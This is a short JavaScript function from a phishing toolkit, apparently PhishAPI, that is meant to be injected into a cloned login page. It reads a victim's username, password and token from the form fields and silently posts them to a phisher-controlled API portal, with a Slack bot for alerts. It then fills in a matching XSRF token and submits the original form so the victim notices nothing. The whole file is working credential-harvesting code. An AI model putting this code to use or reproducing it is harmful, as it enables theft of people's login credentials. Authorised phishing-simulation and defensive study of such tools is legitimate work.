function SubForm(APIPortal,FormName,Project,SlackBotName,SlackEmoji,UsernameInputID,PasswordInputID,RedirURL,XSRFToken){
	// Phisher Controlled Variables
	var APIPortal = SubForm.arguments[0];
	var FormName = SubForm.arguments[1];
	var Project = SubForm.arguments[2];
	var SlackBotName = SubForm.arguments[3];
	var SlackEmoji = SubForm.arguments[4];
	var UsernameInputID = SubForm.arguments[5];
	var PasswordInputID = SubForm.arguments[6];
	var RedirURL = SubForm.arguments[7];
	var XSRFToken = SubForm.arguments[8];
	// Vistim Controlled Variables
	var Username = document.getElementById(UsernameInputID).value;
	var Password = document.getElementById(PasswordInputID).value;
	var Token = document.getElementById("token");
    if(Token){
        var Token = Token.value;
    } else {
		Token = '';
	}
	
	var URL = 'project='+Project+'&username='+Username+'&password='+Password+'&token='+Token+'&slackbotname='+SlackBotName+'&slackemoji='+SlackEmoji+'&xsrftoken='+XSRFToken+'&redirurl='+RedirURL;

    $.ajax({
        // Post Transparent AJAX Request to PhishAPI Server
		url:APIPortal,
        type:'post',
		data:encodeURI(URL),
        success:function (msg){		
		
				// Grab Remote XSRF Token if Provided and Update Input Field to Match
				if(XSRFToken){
				var xsrfvalue = msg;
				if(document.getElementsByName(XSRFToken)){document.getElementsByName(XSRFToken)[0].value = xsrfvalue;}
				if(document.getElementById(XSRFToken)){document.getElementById(XSRFToken).value = xsrfvalue;}
				}
				
				// Submit Original Form
				var x = document.getElementsByName(FormName);
				x[0].submit();
        }
    });

}
